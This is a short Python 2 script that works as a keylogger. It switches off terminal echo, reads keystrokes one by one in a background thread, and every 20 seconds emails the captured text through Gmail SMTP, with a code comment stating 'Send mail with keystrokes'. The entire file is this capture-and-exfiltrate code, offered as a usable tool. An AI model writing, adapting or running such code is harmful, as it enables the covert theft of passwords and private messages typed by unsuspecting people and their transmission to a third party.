__author__ = 'sergio'

import termios, fcntl, sys, os, threading, smtplib, time, optparse

class env:

    def __init__(self, fd, oldterm, oldflags):
        self.fd = fd
        self.oldterm = oldterm
        self.oldflags = oldflags

class abc:
    def __init__(self, lock):
        self.t = threading.Thread(target=self.job, args=(lock,))
        self.t.daemon = True
        self.text = ""

    def job(self, lock):
        loop = True
        while loop:
            with lock:
                try:
                    self.text += sys.stdin.read(1) + " "
                except IOError:
                    pass

    def getText(self):
        return self.text

def main(address, passwd):

    e = setup()
    lock = threading.Lock()
    a = abc(lock)
    a.t.start()
    count = 0
    try:
        while 1:
            time.sleep(20) #
            lock.acquire()  #Stop thread for a while
            mail(address, passwd, a.getText(), count) #Send mail with keystrokes
            lock.release()
    finally:
        end(e.oldterm, e.oldflags, e.fd)

def mail(address, passwd, text, count):
    print "Testing mail..."
    count += 1

    msg = "\r\n".join([
        "From: %s" % address,
        "To: %s" % address,
        "Subject: Mail %d" % count,
        "",
        text
    ])

    s = smtplib.SMTP('smtp.gmail.com:587')
    s.ehlo()
    s.starttls()
    s.login(address,passwd)
    s.sendmail(address,address, msg)
    s.quit()

    time.sleep(5)

def setup():
    fd = sys.stdin.fileno()

    oldterm = termios.tcgetattr(fd)
    newattr = termios.tcgetattr(fd)
    newattr[3] = newattr[3] & ~termios.ICANON & ~termios.ECHO
    termios.tcsetattr(fd, termios.TCSANOW, newattr)

    oldflags = fcntl.fcntl(fd, fcntl.F_GETFL)
    fcntl.fcntl(fd, fcntl.F_SETFL, oldflags | os.O_NONBLOCK)

    return env(fd, oldterm, oldflags)

def end(oldterm, oldflags, fd):
    termios.tcsetattr(fd, termios.TCSAFLUSH, oldterm)
    fcntl.fcntl(fd, fcntl.F_SETFL, oldflags)

def print_help():
    print "Bad Arguments!"

if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option('-m','--address', action="store", help="Gmail account address", dest="address", type="string")
    parser.add_option('-p','--password', action="store", help="Gmail account password", dest="passw", type="string")

    (opts, args) = parser.parse_args()
    if opts.address is not None and opts.passw is not None:
        main(opts.address, opts.passw)
    else:
        print_help()